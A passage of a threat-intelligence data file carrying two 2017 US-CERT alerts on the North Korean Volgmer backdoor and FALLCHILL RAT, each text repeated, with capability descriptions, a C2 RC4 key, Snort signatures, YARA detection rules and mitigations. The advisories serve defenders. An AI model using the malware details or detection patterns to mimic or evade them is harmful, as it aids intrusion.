Attacks</a> for more information.</li></ul><h4><strong><em>Response to Unauthorized Network Access</em></strong></h4><ul><li><strong>Contact DHS or your local FBI office immediately.</strong> To report an intrusion and request resources for incident response or technical assistance, contact DHS NCCIC (<a href=\"https://www.us-cert.govmailto:NCCICCustomerService@hq.dhs.gov\">NCCICCustomerService@hq.dhs.gov</a> or 888-282-0870), FBI through a local field office, or the FBI’s Cyber Division (<a href=\"https://www.us-cert.govmailto:CyWatch@fbi.gov\">CyWatch@fbi.gov</a> or 855-292-3937).</li></ul>\t\t    \n\t\t    <h3>References</h3>\n\t\t    <ul>\n            \t\t    </ul>\n\t\t    \n\t\t    <h3>Revision History</h3>\n\t\t    <ul>\n\t\t    \t\t    \t<li>November 14, 2017: Initial version</li>\n\t\t    \t\t\t    </ul>\n\t\t    <hr />\n\t\t    <p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t    <br />",
			"external_references": [
				{
					"external_id": "10204 at https://www.us-cert.gov",
					"url": "https://www.us-cert.gov/ncas/alerts/TA17-318B",
					"source_name": "open source",
					"description": "Original release date: November 14, 2017 | Last revised: November 22, 2017<br />\n\t\t    <h3>Systems Affected</h3>\n\t\t    <p>Network systems</p>\t\t    \n\t\t    <h3>Overview</h3>\n\t\t    <p>This joint Technical Alert (TA) is the result of analytic efforts between the Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI). Working with U.S. government partners, DHS and FBI identified Internet Protocol (IP) addresses and other indicators of compromise (IOCs) associated with a Trojan malware variant used by the North Korean government—commonly known as Volgmer. The U.S. Government refers to malicious cyber activity by the North Korean government as HIDDEN COBRA. For more information on HIDDEN COBRA activity, visit <a href=\"https://www.us-cert.gov/hiddencobra\">https://www.us-cert.gov/hiddencobra</a>.</p><p>FBI has high confidence that HIDDEN COBRA actors are using the IP addresses—listed in this report’s IOC files—to maintain a presence on victims’ networks and to further network exploitation. DHS and FBI are distributing these IP addresses to enable network defense and reduce exposure to North Korean government malicious cyber activity.</p><p>This alert includes IOCs related to HIDDEN COBRA, IP addresses linked to systems infected with Volgmer malware, malware descriptions, and associated signatures. This alert also includes suggested response actions to the IOCs provided, recommended mitigation techniques, and information on reporting incidents. If users or administrators detect activity associated with the Volgmer malware, they should immediately flag it, report it to the DHS National Cybersecurity and Communications Integration Center (NCCIC) or the FBI Cyber Watch (CyWatch), and give it the highest priority for enhanced mitigation.</p><p>For a downloadable copy of IOCs, see:</p><ul><li>IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-318B-IOCs.csv\">.csv</a>)</li><li>IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-318B-IOCs.xml\">.stix</a>)</li></ul><p>NCCIC conducted analysis on five files associated with or identified as Volgmer malware and produced a Malware Analysis Report (MAR). MAR-10135536-D examines the tactics, techniques, and procedures observed. For a downloadable copy of the MAR, see:</p><ul><li>MAR (<a href=\"https://www.us-cert.gov/sites/default/files/publications/MAR-10135536-D_WHITE_S508C.PDF\">.pdf</a>)</li><li>MAR IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/MAR-10135536-D_WHITE_stix.xml\">.stix</a>)</li></ul>\t\t    \n\t\t    <h3>Description</h3>\n\t\t    <p>Volgmer is a backdoor Trojan designed to provide covert access to a compromised system. Since at least 2013, HIDDEN COBRA actors have been observed using Volgmer malware in the wild to target the government, financial, automotive, and media industries.</p><p>It is suspected that spear phishing is the primary delivery mechanism for Volgmer infections; however, HIDDEN COBRA actors use a suite of custom tools, some of which could also be used to initially compromise a system. Therefore, it is possible that additional HIDDEN COBRA malware may be present on network infrastructure compromised with Volgmer</p><p>The U.S. Government has analyzed Volgmer’s infrastructure and have identified it on systems using both dynamic and static IP addresses. At least 94 static IP addresses were identified, as well as dynamic IP addresses registered across various countries. The greatest concentrations of dynamic IPs addresses are identified below by approximate percentage:</p><ul><li>India (772 IPs) 25.4 percent</li><li>Iran (373 IPs) 12.3 percent</li><li>Pakistan (343 IPs) 11.3 percent</li><li>Saudi Arabia (182 IPs) 6 percent</li><li>Taiwan (169 IPs) 5.6 percent</li><li>Thailand (140 IPs) 4.6 percent</li><li>Sri Lanka (121 IPs) 4 percent</li><li>China (82 IPs, including Hong Kong (12)) 2.7 percent</li><li>Vietnam (80 IPs) 2.6 percent</li><li>Indonesia (68 IPs) 2.2 percent</li><li>Russia (68 IPs) 2.2 percent</li></ul><h3><strong>Technical Details</strong></h3><p>As a backdoor Trojan, Volgmer has several capabilities including: gathering system information, updating service registry keys, downloading and uploading files, executing commands, terminating processes, and listing directories. In one of the samples received for analysis, the US-CERT Code Analysis Team observed botnet controller functionality.</p><p>Volgmer payloads have been observed in 32-bit form as either executables or dynamic-link library (.dll) files. The malware uses a custom binary protocol to beacon back to the command and control (C2) server, often via TCP port 8080 or 8088, with some payloads implementing Secure Socket Layer (SSL) encryption to obfuscate communications.</p><p>Malicious actors commonly maintain persistence on a victim’s system by installing the malware-as-a-service. Volgmer queries the system and randomly selects a service in which to install a copy of itself. The malware then overwrites the ServiceDLL entry in the selected service's registry entry. In some cases, HIDDEN COBRA actors give the created service a pseudo-random name that may be composed of various hardcoded words.</p><h3><strong>Detection and Response</strong></h3><p>This alert’s IOC files provide HIDDEN COBRA indicators related to Volgmer. DHS and FBI recommend that network administrators review the information provided, identify whether any of the provided IP addresses fall within their organizations’ allocated IP address space, and—if found—take necessary measures to remove the malware.</p><p>When reviewing network perimeter logs for the IP addresses, organizations may find instances of these IP addresses attempting to connect to their systems. Upon reviewing the traffic from these IP addresses, system owners may find some traffic relates to malicious activity and some traffic relates to legitimate activity.</p><h3>Network Signatures and Host-Based Rules</h3><p>This section contains network signatures and host-based rules that can be used to detect malicious activity associated with HIDDEN COBRA actors. Although created using a comprehensive vetting process, the possibility of false positives always remains. These signatures and rules should be used to supplement analysis and should not be used as a sole source of attributing this activity to HIDDEN COBRA actors.</p><h4>Network Signatures</h4><p><code>alert tcp any any -&gt; any any (msg:\"Malformed_UA\"; content:\"User-Agent: Mozillar/\"; depth:500; sid:99999999;)</code></p><p>___________________________________________________________________________________________________</p><h4>YARA Rules</h4><p><code>rule volgmer<br />{<br />meta:<br />    description = \"Malformed User Agent\"<br />strings:<br />    $s = \"Mozillar/\"<br />condition:<br />    (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and $s<br />}</code></p>\t\t    \n\t\t    <h3>Impact</h3>\n\t\t    <p>A successful network intrusion can have severe impacts, particularly if the compromise becomes public and sensitive information is exposed. Possible impacts include</p><ul><li>temporary or permanent loss of sensitive or proprietary information,</li><li>disruption to regular operations,</li><li>financial losses incurred to restore systems and files, and</li><li>potential harm to an organization’s reputation.</li></ul>\t\t    \n\t\t    <h3>Solution</h3>\n\t\t    <h4><strong><em>Mitigation Strategies</em></strong></h4><p>DHS recommends that users and administrators use the following best practices as preventive measures to protect their computer networks:</p><ul><li>Use application whitelisting to help prevent malicious software and unapproved programs from running. Application whitelisting is one of the best security strategies as it allows only specified programs to run, while blocking all others, including malicious software.</li><li>Keep operating systems and software up-to-date with the latest patches. Vulnerable applications and operating systems are the target of most attacks. Patching with the latest updates greatly reduces the number of exploitable entry points available to an attacker.</li><li>Maintain up-to-date antivirus software, and scan all software downloaded from the Internet before executing.</li><li>Restrict users’ abilities (permissions) to install and run unwanted software applications, and apply the principle of “least privilege” to all systems and services. Restricting these privileges may prevent malware from running or limit its capability to spread through the network.</li><li>Avoid enabling macros from email attachments. If a user opens the attachment and enables macros, embedded code will execute the malware on the machine. For enterprises or organizations, it may be best to block email messages with attachments from suspicious sources. For information on safely handling email attachments, see <a href=\"https://www.us-cert.gov/sites/default/files/publications/emailscams_0905.pdf\">Recognizing and Avoiding Email Scams</a>. Follow safe practices when browsing the web. See <a href=\"https://www.us-cert.gov/ncas/tips/ST04-003\">Good Security Habits</a> and <a href=\"https://www.us-cert.gov/ncas/tips/ST06-008\">Safeguarding Your Data</a> for additional details.</li><li>Do not follow unsolicited web links in emails. See <a href=\"https://www.us-cert.gov/ncas/tips/ST04-014\">Avoiding Social Engineering and Phishing Attacks</a> for more information.</li></ul><h4><strong><em>Response to Unauthorized Network Access</em></strong></h4><ul><li><strong>Contact DHS or your local FBI office immediately.</strong> To report an intrusion and request resources for incident response or technical assistance, contact DHS NCCIC (<a href=\"https://www.us-cert.govmailto:NCCICCustomerService@hq.dhs.gov\">NCCICCustomerService@hq.dhs.gov</a> or 888-282-0870), FBI through a local field office, or the FBI’s Cyber Division (<a href=\"https://www.us-cert.govmailto:CyWatch@fbi.gov\">CyWatch@fbi.gov</a> or 855-292-3937).</li></ul>\t\t    \n\t\t    <h3>References</h3>\n\t\t    <ul>\n            \t\t    </ul>\n\t\t    \n\t\t    <h3>Revision History</h3>\n\t\t    <ul>\n\t\t    \t\t    \t<li>November 14, 2017: Initial version</li>\n\t\t    \t\t\t    </ul>\n\t\t    <hr />\n\t\t    <p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t    <br />"
				}
			],
			"created_by_ref": "US-CERT",
			"created": "2017-11-14T19:00:38.000Z"
		},
		{
			"type": "report",
			"title": "TA17-318A: HIDDEN COBRA – North Korean Remote Administration Tool: FALLCHILL",
			"name": "TA17-318A: HIDDEN COBRA – North Korean Remote Administration Tool: FALLCHILL",
			"id": "report--45a907a9-ce4c-4586-80c9-1412aaf383e1",
			"description": "Original release date: November 14, 2017 | Last revised: November 22, 2017<br />\n\t\t    <h3>Systems Affected</h3>\n\t\t    <p>Network systems</p>\t\t    \n\t\t    <h3>Overview</h3>\n\t\t    <p>This joint Technical Alert (TA) is the result of analytic efforts between the Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI). Working with U.S. government partners, DHS and FBI identified Internet Protocol (IP) addresses and other indicators of compromise (IOCs) associated with a remote administration tool (RAT) used by the North Korean government—commonly known as FALLCHILL. The U.S. Government refers to malicious cyber activity by the North Korean government as HIDDEN COBRA. For more information on HIDDEN COBRA activity, visit <a href=\"https://www.us-cert.gov/hiddencobra\">https://www.us-cert.gov/hiddencobra</a>.</p><p>FBI has high confidence that HIDDEN COBRA actors are using the IP addresses—listed in this report’s IOC files—to maintain a presence on victims’ networks and to further network exploitation. DHS and FBI are distributing these IP addresses to enable network defense and reduce exposure to any North Korean government malicious cyber activity.</p><p>This alert includes IOCs related to HIDDEN COBRA, IP addresses linked to systems infected with FALLCHILL malware, malware descriptions, and associated signatures. This alert also includes suggested response actions to the IOCs provided, recommended mitigation techniques, and information on reporting incidents. If users or administrators detect activity associated with the FALLCHILL malware, they should immediately flag it, report it to the DHS National Cybersecurity and Communications Integration Center (NCCIC) or the FBI Cyber Watch (CyWatch), and give it the highest priority for enhanced mitigation.</p><p>For a downloadable copy of IOCs, see:</p><ul><li>IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-318A-IOCs.csv\">.csv</a>)</li><li>IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-318A-IOCs.xml\">.stix</a>)</li></ul><p>NCCIC conducted analysis on two samples of FALLCHILL malware and produced a Malware Analysis Report (MAR). MAR-10135536-A examines the tactics, techniques, and procedures observed in the malware. For a downloadable copy of the MAR, see:</p><ul><li>MAR (<a href=\"https://www.us-cert.gov/sites/default/files/publications/MAR-10135536-A_WHITE_S508C.pdf\">.pdf</a>)</li><li>MAR IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/MAR-10135536-A_WHITE_stix.xml\">.stix</a>)</li></ul>\t\t    \n\t\t    <h3>Description</h3>\n\t\t    <p>According to trusted third-party reporting, HIDDEN COBRA actors have likely been using FALLCHILL malware since 2016 to target the aerospace, telecommunications, and finance industries. The malware is a fully functional RAT with multiple commands that the actors can issue from a command and control (C2) server to a victim’s system via dual proxies. FALLCHILL typically infects a system as a file dropped by other HIDDEN COBRA malware or as a file downloaded unknowingly by users when visiting sites compromised by HIDDEN COBRA actors. HIDDEN COBRA actors use an external tool or dropper to install the FALLCHILL malware-as-a-service to establish persistence. Because of this, additional HIDDEN COBRA malware may be present on systems compromised with FALLCHILL.</p><p>During analysis of the infrastructure used by FALLCHILL malware, the U.S. Government identified 83 network nodes. Additionally, using publicly available registration information, the U.S. Government identified the countries in which the infected IP addresses are registered.</p><h3><strong>Technical Details</strong></h3><p>FALLCHILL is the primary component of a C2 infrastructure that uses multiple proxies to obfuscate network traffic between HIDDEN COBRA actors and a victim’s system. According to trusted third-party reporting, communication flows from the victim’s system to HIDDEN COBRA actors using a series of proxies as shown in figure 1.</p><p><img alt=\"HIDDEN COBRA Communication Flow\" src=\"https://www.us-cert.gov/sites/default/files/publications/alert-graphic-01.png\" style=\"width: 786px; height: 191px;\" /></p><h5>Figure 1. HIDDEN COBRA Communication Flow</h5><p>FALLCHILL uses fake Transport Layer Security (TLS) communications, encoding the data with RC4 encryption with the following key: [0d 06 09 2a 86 48 86 f7 0d 01 01 01 05 00 03 82]. FALLCHILL collects basic system information and beacons the following to the C2:</p><ul><li>operating system (OS) version information,</li><li>processor information,</li><li>system name,</li><li>local IP address information,</li><li>unique generated ID, and</li><li>media access control (MAC) address.</li></ul><p>FALLCHILL contains the following built-in functions for remote operations that provide various capabilities on a victim’s system:</p><ul><li>retrieve information about all installed disks, including the disk type and the amount of free space on the disk;</li><li>create, start, and terminate a new process and its primary thread;</li><li>search, read, write, move, and execute files;</li><li>get and modify file or directory timestamps;</li><li>change the current directory for a process or file; and</li><li>delete malware and artifacts associated with the malware from the infected system.</li></ul><h3>Detection and Response</h3><p>This alert’s IOC files provide HIDDEN COBRA indicators related to FALLCHILL. DHS and FBI recommend that network administrators review the information provided, identify whether any of the provided IP addresses fall within their organizations’ allocated IP address space, and—if found—take necessary measures to remove the malware.</p><p>When reviewing network perimeter logs for the IP addresses, organizations may find instances of these IP addresses attempting to connect to their systems. Upon reviewing the traffic from these IP addresses, system owners may find some traffic relates to malicious activity and some traffic relates to legitimate activity.</p><h3>Network Signatures and Host-Based Rules</h3><p>This section contains network signatures and host-based rules that can be used to detect malicious activity associated with HIDDEN COBRA actors. Although created using a comprehensive vetting process, the possibility of false positives always remains. These signatures and rules should be used to supplement analysis and should not be used as a sole source of attributing this activity to HIDDEN COBRA actors.</p><h4>Network Signatures</h4><p><code>alert tcp any any -&gt; any any (msg:\"Malicious SSL 01 Detected\";content:\"|17 03 01 00 08|\";  pcre:\"/\\x17\\x03\\x01\\x00\\x08.{4}\\x04\\x88\\x4d\\x76/\"; rev:1; sid:2;)</code></p><p>___________________________________________________________________________________________</p><p><code>alert tcp any any -&gt; any any (msg:\"Malicious SSL 02 Detected\";content:\"|17 03 01 00 08|\";  pcre:\"/\\x17\\x03\\x01\\x00\\x08.{4}\\x06\\x88\\x4d\\x76/\"; rev:1; sid:3;)</code></p><p>___________________________________________________________________________________________</p><p><code>alert tcp any any -&gt; any any (msg:\"Malicious SSL 03 Detected\";content:\"|17 03 01 00 08|\";  pcre:\"/\\x17\\x03\\x01\\x00\\x08.{4}\\xb2\\x63\\x70\\x7b/\"; rev:1; sid:4;)</code></p><p>___________________________________________________________________________________________</p><p><code>alert tcp any any -&gt; any any (msg:\"Malicious SSL 04 Detected\";content:\"|17 03 01 00 08|\";  pcre:\"/\\x17\\x03\\x01\\x00\\x08.{4}\\xb0\\x63\\x70\\x7b/\"; rev:1; sid:5;)</code></p><div>___________________________________________________________________________________________</div><h4>YARA Rules</h4><p>The following rules were provided to NCCIC by a trusted third party for the purpose of assisting in the identification of malware associated with this alert.</p><p>THIS DHS/NCCIC MATERIAL IS FURNISHED ON AN “AS-IS” BASIS.  These rules have been tested and determined to function effectively in a lab environment, but we have no way of knowing if they may function differently in a production network.  Anyone using these rules are encouraged to test them using a data set representitive of their environment.</p><p><code>rule rc4_stack_key_fallchill<br />{<br />meta:<br />    description = \"rc4_stack_key\"<br />strings:<br />    $stack_key = { 0d 06 09 2a ?? ?? ?? ?? 86 48 86 f7 ?? ?? ?? ?? 0d 01 01 01 ?? ?? ?? ?? 05 00 03 82 41 8b c9 41 8b d1 49 8b 40 08 48 ff c2 88 4c 02 ff ff c1 81 f9 00 01 00 00 7c eb }<br />condition:<br />    (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and $stack_key<br />}</code></p><p><code>rule success_fail_codes_fallchill</code></p><p><code>{<br />meta:<br />    description = \"success_fail_codes\"<br />strings:<br />    $s0 = { 68 7a 34 12 00 }  <br />    $s1 = { ba 7a 34 12 00 }  <br />    $f0 = { 68 5c 34 12 00 }  <br />    $f1 = { ba 5c 34 12 00 }<br />condition:<br />    (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and (($s0 and $f0) or ($s1 and $f1))<br />}</code></p><p>___________________________________________________________________________________________</p>\t\t    \n\t\t    <h3>Impact</h3>\n\t\t    <p>A successful network intrusion can have severe impacts, particularly if the compromise becomes public and sensitive information is exposed. Possible impacts include:</p><ul><li>temporary or permanent loss of sensitive or proprietary information,</li><li>disruption to regular operations,</li><li>financial losses incurred to restore systems and files, and</li><li>potential harm to an organization’s reputation.</li></ul>\t\t    \n\t\t    <h3>Solution</h3>\n\t\t    <h4><strong><em>Mitigation Strategies</em></strong></h4><p>DHS recommends that users and administrators use the following best practices as preventive measures to protect their computer networks:</p><ul><li>Use application whitelisting to help prevent malicious software and unapproved programs from running. Application whitelisting is one of the best security strategies as it allows only specified programs to run, while blocking all others, including malicious software.</li><li>Keep operating systems and software up-to-date with the latest patches. Vulnerable applications and operating systems are the target of most attacks. Patching with the latest updates greatly reduces the number of exploitable entry points available to an attacker.</li><li>Maintain up-to-date antivirus software, and scan all software downloaded from the Internet before executing.</li><li>Restrict users’ abilities (permissions) to install and run unwanted software applications, and apply the principle of “least privilege” to all systems and services. Restricting these privileges may prevent malware from running or limit its capability to spread through the network.</li><li>Avoid enabling macros from email attachments. If a user opens the attachment and enables macros, embedded code will execute the malware on the machine. For enterprises or organizations, it may be best to block email messages with attachments from suspicious sources. For information on safely handling email attachments, see <a href=\"https://www.us-cert.gov/sites/default/files/publications/emailscams_0905.pdf\">Recognizing and Avoiding Email Scams</a>. Follow safe practices when browsing the web. See <a href=\"https://www.us-cert.gov/ncas/tips/ST04-003\">Good Security Habits</a> and <a href=\"https://www.us-cert.gov/ncas/tips/ST06-008\">Safeguarding Your Data</a> for additional details.</li><li>Do not follow unsolicited web links in emails. See <a href=\"https://www.us-cert.gov/ncas/tips/ST04-014\">Avoiding Social Engineering and Phishing Attacks</a> for more information.</li></ul><h4><strong><em>Response to Unauthorized Network Access</em></strong></h4><ul><li><strong>Contact DHS or your local FBI office immediately.</strong> To report an intrusion and request resources for incident response or technical assistance, contact DHS NCCIC (<a href=\"https://www.us-cert.govmailto:NCCICCustomerService@hq.dhs.gov\">NCCICCustomerService@hq.dhs.gov</a> or 888-282-0870), FBI through a local field office, or the FBI’s Cyber Division (<a href=\"https://www.us-cert.govmailto:CyWatch@fbi.gov\">CyWatch@fbi.gov</a> or 855-292-3937).</li></ul><p> </p>\t\t    \n\t\t    <h3>References</h3>\n\t\t    <ul>\n            \t\t    </ul>\n\t\t    \n\t\t    <h3>Revision History</h3>\n\t\t    <ul>\n\t\t    \t\t    \t<li>November 14, 2017: Initial version</li>\n\t\t    \t\t\t    </ul>\n\t\t    <hr />\n\t\t    <p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t    <br />",
			"external_references": [
				{
					"external_id": "10197 at https://www.us-cert.gov",
					"url": "https://www.us-cert.gov/ncas/alerts/TA17-318A",
					"source_name": "open source",
					"description": "Original release date: November 14, 2017 | Last revised: November 22, 2017<br />\n\t\t    <h3>Systems Affected</h3>\n\t\t    <p>Network systems</p>\t\t    \n\t\t    <h3>Overview</h3>\n\t\t    <p>This joint Technical Alert (TA) is the result of analytic efforts between the Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI). Working with U.S. government partners, DHS and FBI identified Internet Protocol (IP) addresses and other indicators of compromise (IOCs) associated with a remote administration tool (RAT) used by the North Korean government—commonly known as FALLCHILL. The U.S. Government refers to malicious cyber activity by the North Korean government as HIDDEN COBRA. For more information on HIDDEN COBRA activity, visit <a href=\"https://www.us-cert.gov/hiddencobra\">https://www.us-cert.gov/hiddencobra</a>.</p><p>FBI has high confidence that HIDDEN COBRA actors are using the IP addresses—listed in this report’s IOC files—to maintain a presence on victims’ networks and to further network exploitation. DHS and FBI are distributing these IP addresses to enable network defense and reduce exposure to any North Korean government malicious cyber activity.</p><p>This alert includes IOCs related to HIDDEN COBRA, IP addresses linked to systems infected with FALLCHILL malware, malware descriptions, and associated signatures. This alert also includes suggested response actions to the IOCs provided, recommended mitigation techniques, and information on reporting incidents. If users or administrators detect activity associated with the FALLCHILL malware, they should immediately flag it, report it to the DHS National Cybersecurity and Communications Integration Center (NCCIC) or the FBI Cyber Watch (CyWatch), and give it the highest priority for enhanced mitigation.</p><p>For a downloadable copy of IOCs, see:</p><ul><li>IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-318A-IOCs.csv\">.csv</a>)</li><li>IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-318A-IOCs.xml\">.stix</a>)</li></ul><p>NCCIC conducted analysis on two samples of FALLCHILL malware and produced a Malware Analysis Report (MAR). MAR-10135536-A examines the tactics, techniques, and procedures observed in the malware. For a downloadable copy of the MAR, see:</p><ul><li>MAR (<a href=\"https://www.us-cert.gov/sites/default/files/publications/MAR-10135536-A_WHITE_S508C.pdf\">.pdf</a>)</li><li>MAR IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/MAR-10135536-A_WHITE_stix.xml\">.stix</a>)</li></ul>\t\t    \n\t\t    <h3>Description</h3>\n\t\t    <p>According to trusted third-party reporting, HIDDEN COBRA actors have likely been using FALLCHILL malware since 2016 to target the aerospace, telecommunications, and finance industries. The malware is a fully functional RAT with multiple commands that the actors can issue from a command and control (C2) server to a victim’s system via dual proxies. FALLCHILL typically infects a system as a file dropped by other HIDDEN COBRA malware or as a file downloaded unknowingly by users when visiting sites compromised by HIDDEN COBRA actors. HIDDEN COBRA actors use an external tool or dropper to install the FALLCHILL malware-as-a-service to establish persistence. Because of this, additional HIDDEN COBRA malware may be present on systems compromised with FALLCHILL.</p><p>During analysis of the infrastructure used by FALLCHILL malware, the U.S. Government identified 83 network nodes. Additionally, using publicly available registration information, the U.S. Government identified the countries in which the infected IP addresses are registered.</p><h3><strong>Technical Details</strong></h3><p>FALLCHILL is the primary component of a C2 infrastructure that uses multiple proxies to obfuscate network traffic between HIDDEN COBRA actors and a victim’s system. According to trusted third-party reporting, communication flows from the victim’s system to HIDDEN COBRA actors using a series of proxies as shown in figure 1.</p><p><img alt=\"HIDDEN COBRA Communication Flow\" src=\"https://www.us-cert.gov/sites/default/files/publications/alert-graphic-01.png\" style=\"width: 786px; height: 191px;\" /></p><h5>Figure 1. HIDDEN COBRA Communication Flow</h5><p>FALLCHILL uses fake Transport Layer Security (TLS) communications, encoding the data with RC4 encryption with the following key: [0d 06 09 2a 86 48 86 f7 0d 01 01 01 05 00 03 82]. FALLCHILL collects basic system information and beacons the following to the C2:</p><ul><li>operating system (OS) version information,</li><li>processor information,</li><li>system name,</li><li>local IP address information,</li><li>unique generated ID, and</li><li>media access control (MAC) address.</li></ul><p>FALLCHILL contains the following built-in functions for remote operations that provide various capabilities on a victim’s system:</p><ul><li>retrieve information about all installed disks, including the disk type and the amount of free space on the disk;</li><li>create, start, and terminate a new process and its primary thread;</li><li>search, read, write, move, and execute files;</li><li>get and modify file or directory timestamps;</li><li>change the current directory for a process or file; and</li><li>delete malware and artifacts associated with the malware from the infected system.</li></ul><h3>Detection and Response</h3><p>This alert’s IOC files provide HIDDEN COBRA indicators related to FALLCHILL. DHS and FBI recommend that network administrators review the information provided, identify whether any of the provided IP addresses fall within their organizations’ allocated IP address space, and—if found—take necessary measures to remove the malware.</p><p>When reviewing network perimeter logs for the IP addresses, organizations may find instances of these IP addresses attempting to connect to their systems. Upon reviewing the traffic from these IP addresses, system owners may find some traffic relates to malicious activity and some traffic relates to legitimate activity.</p><h3>Network Signatures and Host-Based Rules</h3><p>This section contains network signatures and host-based rules that can be used to detect malicious activity associated with HIDDEN COBRA actors. Although created using a comprehensive vetting process, the possibility of false positives always remains. These signatures and rules should be used to supplement analysis and should not be used as a sole source of attributing this activity to HIDDEN COBRA actors.</p><h4>Network Signatures</h4><p><code>alert tcp any any -&gt; any any (msg:\"Malicious SSL 01 Detected\";content:\"|17 03 01 00 08|\";  pcre:\"/\\x17\\x03\\x01\\x00\\x08.{4}\\x04\\x88\\x4d\\x76/\"; rev:1; sid:2;)</code></p><p>___________________________________________________________________________________________</p><p><code>alert tcp any any -&gt; any any (msg:\"Malicious SSL 02 Detected\";content:\"|17 03 01 00 08|\";  pcre:\"/\\x17\\x03\\x01\\x00\\x08.{4}\\x06\\x88\\x4d\\x76/\"; rev:1; sid:3;)</code></p><p>___________________________________________________________________________________________</p><p><code>alert tcp any any -&gt; any any (msg:\"Malicious SSL 03 Detected\";content:\"|17 03 01 00 08|\";  pcre:\"/\\x17\\x03\\x01\\x00\\x08.{4}\\xb2\\x63\\x70\\x7b/\"; rev:1; sid:4;)</code></p><p>___________________________________________________________________________________________</p><p><code>alert tcp any any -&gt; any any (msg:\"Malicious SSL 04 Detected\";content:\"|17 03 01 00 08|\";  pcre:\"/\\x17\\x03\\x01\\x00\\x08.{4}\\xb0\\x63\\x70\\x7b/\"; rev:1; sid:5;)</code></p><div>___________________________________________________________________________________________</div><h4>YARA Rules</h4><p>The following rules were provided to NCCIC by a trusted third party for the purpose of assisting in the identification of malware associated with this alert.</p><p>THIS DHS/NCCIC MATERIAL IS FURNISHED ON AN “AS-IS” BASIS.  These rules have been tested and determined to function effectively in a lab environment, but we have no way of knowing if they may function differently in a production network.  Anyone using these rules are encouraged to test them using a data set representitive of their environment.</p><p><code>rule rc4_stack_key_fallchill<br />{<br />meta:<br />    description = \"rc4_stack_key\"<br />strings:<br />    $stack_key = { 0d 06 09 2a ?? ?? ?? ?? 86 48 86 f7 ?? ?? ?? ?? 0d 01 01 01 ?? ?? ?? ?? 05 00 03 82 41 8b c9 41 8b d1 49 8b 40 08 48 ff c2 88 4c 02 ff ff c1 81 f9 00 01 00 00 7c eb }<br />condition:<br />    (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and $stack_key<br />}</code></p><p><code>rule success_fail_codes_fallchill</code></p><p><code>{<br />meta:<br />    description = \"success_fail_codes\"<br />strings:<br />    $s0 = { 68 7a 34 12 00 }  <br />    $s1 = { ba 7a 34 12 00 }  <br />    $f0 = { 68 5c 34 12 00 }  <br />    $f1 = { ba 5c 34 12 00 }<br />condition:<br />    (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and (($s0 and $f0) or ($s1 and $f1))<br />}</code></p><p>___________________________________________________________________________________________</p>\t\t    \n\t\t    <h3>Impact</h3>\n\t\t    <p>A successful network intrusion can have severe impacts, particularly if the compromise becomes public and sensitive information is exposed. Possible impacts include:</p><ul><li>temporary or permanent loss of sensitive or proprietary information,</li><li>disruption to regular operations,</li><li>financial losses incurred to restore systems and files, and</li><li>potential harm to an organization’s reputation.</li></ul>\t\t    \n\t\t    <h3>Solution</h3>\n\t\t    <h4><strong><em>Mitigation Strategies</em></strong></h4><p>DHS recommends that users and administrators use the following best practices as preventive measures to protect their computer networks:</p><ul><li>Use application whitelisting to help prevent malicious software and unapproved programs from running. Application whitelisting is one of the best security strategies as it allows only specified programs to run, while blocking all others, including malicious software.</li><li>Keep operating systems and software up-to-date with the latest patches. Vulnerable applications and operating systems are the target of most attacks. Patching with the latest updates greatly reduces the number of exploitable entry points available to an attacker.</li><li>Maintain up-to-date antivirus software, and scan all software downloaded from the Internet before executing.</li><li>Restrict users’ abilities (permissions) to install and run unwanted software applications, and apply the principle of “least privilege” to all systems and services. Restricting these privileges may prevent malware from running or limit its capability to spread through the network.</li><li>Avoid enabling macros from email attachments. If a user opens the attachment and enables macros, embedded code will execute the malware on the machine. For enterprises or organizations, it may be best to block email messages with attachments from suspicious sources. For information on safely handling email attachments, see <a href=\"https://www.us-cert.gov/sites/default/files/publications/emailscams_0905.pdf\">Recognizing and Avoiding Email Scams</a>. Follow safe practices when browsing the web. See <a href=\"https://www.us-cert.gov/ncas/tips/ST04-003\">Good Security Habits</a> and <a href=\"https://www.us-cert.gov/ncas/tips/ST06-008\">Safeguarding Your Data</a> for additional details.</li><li>Do not follow unsolicited web links in emails. See <a href=\"https://www.us-cert.gov/ncas/tips/ST04-014\">Avoiding Social Engineering and Phishing Attacks</a> for more information.</li></ul><h4><strong><em>Response to Unauthorized Network Access</em></strong></h4><ul><li><strong>Contact DHS or your local FBI office immediately.</strong> To report an intrusion and request resources for incident response or technical assistance, contact DHS NCCIC (<a href=\"https://www.us-cert.govmailto:NCCICCustomerService@hq.dhs.gov\">NCCICCustomerService@hq.dhs.gov</a> or 888-282-0870), FBI through a local field office, or the FBI’s Cyber Division (<a href=\"https://www.us-cert.govmailto:CyWatch@fbi.gov\">CyWatch@fbi.gov</a> or 855-292-3937).</li></ul><p> </p>\t\t    \n\t\t    <h3>References</h3>\n\t\t    <ul>\n            \t\t    </ul>\n\t\t    \n\t\t    <h3>Revision History</h3>\n\t\t    <ul>\n\t\t    \t\t    \t<li>November 14, 2017: 